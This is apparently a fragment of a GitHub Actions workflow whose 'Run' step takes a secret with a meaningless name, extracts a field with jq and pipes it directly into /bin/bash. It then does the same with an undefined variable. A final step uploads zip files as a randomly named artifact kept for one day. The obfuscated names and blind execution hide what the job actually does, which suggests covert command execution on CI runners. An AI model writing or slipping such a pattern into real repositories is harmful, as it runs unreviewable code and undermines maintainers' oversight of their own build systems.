    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          jk451: ${{ secrets.jk451 }}
        run: |
          printf '%s' "$jk451" | jq -r .g101 | /bin/bash
          echo $t60 | jq -r .yaw420 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: JJtfj0D9
          path: "*.zip"
          retention-days: 1
